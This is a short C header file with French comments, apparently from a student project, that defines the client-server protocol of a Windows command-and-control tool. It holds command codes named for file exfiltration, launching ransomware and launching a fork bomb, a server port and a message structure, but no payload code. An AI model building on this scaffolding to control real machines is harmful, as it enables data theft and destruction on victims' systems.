/**
 * @file protocol.h
 * @brief Définition du protocole de communication entre le client et le serveur
 * @author Valentin Pizzio
 * @date 21/12/2024
 * 
 * Ce fichier contient les définitions des constantes et structures utilisées
 * pour la communication entre le client et le serveur. Il définit notamment
 * les commandes disponibles et la structure des messages échangés.
 */

#ifndef PROTOCOL_H
#define PROTOCOL_H

#include <winsock2.h>

// Tailles maximales des buffers et champs
#define BUFFER_SIZE 4096
#define MAX_FILENAME_LENGTH 256
#define KEY_LENGTH 33  // 32 caractères + '\0'

// Commandes du protocole
#define CMD_CONNECT 1      // Connexion initiale client-serveur
#define CMD_LIST_FILES 2   // Liste les fichiers disponibles
#define CMD_EXFILTRATION 3 // Exfiltre un fichier
#define CMD_RANSOMWARE 4   // Lance le ransomware
#define CMD_FORK 5         // Lance le fork bomb
#define CMD_OUT 6          // Déconnexion

// Port de communication
#define SERVER_PORT 4242

/**
 * @struct Message
 * @brief Structure des messages échangés entre le client et le serveur
 * 
 * Cette structure définit le format des messages échangés dans le protocole.
 * Elle contient la commande à exécuter, le nom du fichier concerné et les données.
 */
typedef struct {
    int cmd;                              // Commande à exécuter
    char filename[MAX_FILENAME_LENGTH];    // Nom du fichier concerné
    char data[BUFFER_SIZE];               // Données du message
} Message;

#endif // PROTOCOL_H
